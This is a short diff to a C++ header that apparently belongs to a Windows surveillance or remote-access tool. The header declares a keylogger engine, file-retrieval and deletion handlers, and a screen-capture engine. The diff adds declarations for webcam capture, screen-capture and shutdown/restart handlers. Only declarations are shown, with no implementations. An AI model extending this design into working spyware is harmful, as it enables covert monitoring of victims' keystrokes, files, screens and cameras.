@@ -7,6 +7,7 @@
 #include <mferror.h>
 #include <shlwapi.h>
 #include <codecapi.h>
+#include <gdiplus.h>
 
 #include <bits/stdc++.h>
 #include "Message.hpp"
@@ -17,6 +18,10 @@ int DisableKeyloggerHandler(const Message& inputMessage, Message& outputMessage)
 int GetFileHandler(const Message& inputMessage, Message& outputMessage);
 int DeleteFileHandler(const Message& inputMessage, Message& outputMessage);
 int ListFilehandler(const Message& inputMessage, Message& outputMessage);
+int ShutdownEngine(const Message& inputMessage, Message& outputMessage);
+int RestartEngine(const Message& inputMessage, Message& outputMessage);
+int ScreenCapHandler(const Message& inputMessage, Message& outputMessage);
+int InvokeWebcamHandler(const Message& inputMessage, Message& outputMessage);
 
 class KeyloggerEngine {
     public:
@@ -42,7 +47,6 @@ class KeyloggerEngine {
     std::mutex bufferLock;
     std::string windowTitle, lastWindowTitle;
     DWORD hookThreadId = 0;
-    DWORD hookThreadId = 0;
 };
 
 class ScreenCapEngine {
@@ -65,7 +69,7 @@ class ScreenCapEngine {
     //   -7/-8 = Second CreateStreamOnHGlobal() failed
     int MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize);
     ScreenCapEngine() = default;
-    ~ScreenCapEngine() {}
+    ~ScreenCapEngine();
     
     private:
     int freelim = 0;
@@ -79,4 +83,23 @@ class ScreenCapEngine {
     ScreenCapEngine(const ScreenCapEngine&) = delete;
     ScreenCapEngine& operator=(const ScreenCapEngine&) = delete;
     int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
+};
+
+
+//width, height = 0 -> size from source
+struct VideoConfig {
+    unsigned int width, height;
+    unsigned int fps;
+    unsigned int bitrate;
+    GUID encodingFormat = MFVideoFormat_H264;
+};
+
+class WebcamEngine {
+    public:
+
+    WebcamEngine() = default;
+    bool run(int millisecond, int fps, std::string*);
+
+    private:
+    class neeko;
 };
